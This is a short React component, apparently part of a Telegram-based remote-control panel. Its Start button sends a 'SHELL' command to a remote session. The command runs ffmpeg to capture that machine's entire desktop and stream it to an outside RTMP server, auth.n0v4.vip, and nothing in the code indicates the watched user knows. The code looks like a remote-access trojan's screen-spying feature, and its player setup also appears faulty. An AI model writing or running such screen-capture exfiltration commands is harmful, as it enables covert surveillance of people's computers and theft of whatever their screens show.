import React, { useEffect, useRef } from 'react';
import {addMessage } from '../api/ClientInfo';
import { SessionID, updateToken } from '../runtimes';
import flvjs from 'flv.js';
import { Button} from '@telegram-apps/telegram-ui';
//
function start(){
    var command = "SHELL\nffmpeg -f gdigrab -i desktop -vcodec libx264 -pix_fmt yuv420p -preset ultrafast -s 854x480 -r 15 -f flv rtmp://auth.n0v4.vip:1935/live/stream";
    addMessage(updateToken(),SessionID,command);
    console.log(command);
}

const RtmpPlayer = () => {
  const videoRef = useRef(null);

  useEffect(() => {
    if (flvjs.isSupported()) {
      const videoElement = videoRef.current;
      const player = flvjs.createPlayer({
        type: 'rtmp',
        url: 'rtmp://localhost:1935/live/stream',  // RTMP 流地址
      });
      if (videoElement) {
        player.attachMediaElement(videoElement);
        player.load();
        player.play();
      }

      // 清理播放器
      return () => {
        player.destroy();
      };
    } else {
      console.error('RTMP not supported in this browser');
    }
  }, []);

  return <div>
    <video ref={videoRef} controls width="100%" />
    <Button onClick={start}>Start</Button>
  </div>;
};

export default RtmpPlayer;
